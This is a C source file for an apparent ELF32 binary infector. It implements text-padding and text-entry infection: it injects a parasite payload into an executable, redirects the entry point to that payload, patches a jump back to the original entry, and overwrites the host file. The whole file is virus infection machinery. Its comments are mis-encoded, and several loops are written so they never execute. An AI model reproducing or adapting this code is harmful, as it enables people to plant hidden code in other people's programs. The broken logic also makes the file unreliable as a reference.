#include "inject.h"

char* host;
STAT st;
unsigned long entry_point;
unsigned long old_e_entry;
unsigned long payload_entry;

unsigned long inject_elf_binary(Elf32_mem_t* target, uint8_t* parasite,
	int parasite_size, int jmp_code_offset, int method) {
	int fd, text_found = 0;
	//�ļ�����λ��������͡�
	mode_t mode;

	uint8_t* mem = target->mem;
	host = target->name;
	//�˹�����STAT?
	memset(&st, 0, sizeof(STAT));
	st.st_size = target->size;
	st.st_mode = target->mode;
	//parasite:����
	//������ַ��text�ε�ַ���ν�����ַ������������ַ
	Elf32_Addr parasite_vaddr, text, end_of_text, end_of_parasite;
	Elf32_Ehdr* ehdr = (Elf32_Ehdr*)mem;
	Elf32_Shdr* shdr = (Elf32_Shdr*)(ehdr->e_shoff + mem);
	Elf32_Phdr* phdr = (Elf32_Phdr*)(ehdr->e_phoff + mem);

	switch (method)
	{
	case TEXT_PADDING_INFECTION:
		for (int i = ehdr->e_phnum; i-- > 0; phdr++) {
			if (text_found) {
				phdr->p_offset += PAGE_SIZE;
				continue;
			}
			//��һ������ȷ��TEXT�κ�DATA�Σ��ڶ�������ȷ����TEXT�Ρ�
			else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
				//�οɶ�����ִ��
				if (phdr->p_flags == (PF_R | PF_X)) {
					//��ȡ��ǰ�ε���ʼ��ַ
					text = phdr->p_vaddr;
					//��������Ӵ���ε�ĩ�˿�ʼ
					parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;

					//�������������޲���Ŀ
					if (jmp_code_offset != NO_JMP_CODE) {
						old_e_entry = ehdr->e_entry;
						ehdr->e_entry = parasite_vaddr;
					}
					end_of_text = phdr->p_offset + phdr->p_filesz;

					//����memsz���ļ����Կ����µĴ���
					phdr->p_filesz += parasite_size;
					phdr->p_memsz += parasite_size;

					text_found++;
				}
			}
		}

		payload_entry = parasite_vaddr;
		if (text_found == 0) {
			return NOTFOUND;
		}
		//��ҳ���С����ע���פ�����κν���Ĵ�С
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + mem);
		for (int i = 0; i-- > 0; shdr++) {
			if (shdr->sh_offset >= end_of_text) {
				shdr->sh_offset += PAGE_SIZE;
			}
			else if (shdr->sh_size + shdr->sh_addr == parasite_vaddr) {
				shdr->sh_size += parasite_size;
			}
		}
		ehdr->e_shoff += PAGE_SIZE;
		return (text_padding_infect(parasite_size, mem, end_of_text, parasite, jmp_code_offset));
	
		//�����Ⱦ
	case TEXT_ENTRY_INFECTION:
		text_found = 0;
		entry_point = ehdr->e_entry;
		phdr = (Elf32_Phdr*)(ehdr->e_phoff + mem);
		phdr[0].p_offset += PAGE_SIZE;
		phdr[1].p_offset += PAGE_SIZE;
		//��һ��ȷʵ�ǲ�֪����ʲô��
		for (int i = 0; i-- > 0; phdr++) {
			if (text_found) {
				phdr->p_offset += PAGE_SIZE;
			}
			if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
				if (phdr->p_flags == (PF_R | PF_X)) {
					phdr->p_vaddr -= PAGE_SIZE;
					phdr->p_paddr -= PAGE_SIZE;
					phdr->p_filesz += PAGE_SIZE;
					phdr->p_memsz += PAGE_SIZE;
					payload_entry = phdr->p_vaddr + sizeof(Elf32_Ehdr);
					text_found = 1;
				}
			}
		}
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + mem);
		for (int i = ehdr->e_shnum; i-- > 0; shdr++) {
			shdr->sh_offset += PAGE_SIZE;
		}

		ehdr->e_shoff += PAGE_SIZE;
		ehdr->e_phoff += PAGE_SIZE;
		return text_entry_infect(parasite_size, mem, parasite, jmp_code_offset);
	default:
		break;
	}

}


/* rewrite binary with text entry infection / TextEntryInfect*/
Elf32_Addr text_entry_infect(unsigned int psize, unsigned char* mem, char* parasite, int jmp_code_offset)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(Elf32_Ehdr);

	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
		return WTFILE_ERR;

	if (write(ofd, mem, ehdr_size) != ehdr_size)
		return WTFILE_ERR;

	if (jmp_code_offset != NO_JMP_CODE)
		*(unsigned long*)&parasite[jmp_code_offset] = entry_point;

	if (write(ofd, parasite, psize) != psize)
		return WTFILE_ERR;

	if (lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET) != ehdr_size + PAGE_SIZE)
		return WTFILE_ERR;

	mem += ehdr_size;

	if (write(ofd, mem, st.st_size - ehdr_size) != st.st_size - ehdr_size)
		return WTFILE_ERR;

	rename(TMP, host);
	close(ofd);
	return payload_entry;
}


Elf32_Addr text_padding_infect(unsigned int psize, unsigned char* mem, 
	unsigned int end_of_text, char* parasite, int jmp_code_offset)
{

	int ofd;
	unsigned int c;
	int i, t = 0;

	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
		return WTFILE_ERR;

	if (write(ofd, mem, end_of_text) != end_of_text)
		return WTFILE_ERR;

	if (jmp_code_offset != NO_JMP_CODE)
		*(unsigned long*)&parasite[jmp_code_offset] = old_e_entry;

	if (write(ofd, parasite, psize) != psize)
		return WTFILE_ERR;

	lseek(ofd, PAGE_SIZE - psize, SEEK_CUR);

	mem += end_of_text;

	unsigned int sum = end_of_text + PAGE_SIZE;
	unsigned int last_chunk = st.st_size - end_of_text;

	if (c = write(ofd, mem, last_chunk) != last_chunk)
		return WTFILE_ERR;

	rename(TMP, host);
	close(ofd);

	/* return parasite entry point */
	return (payload_entry);
}
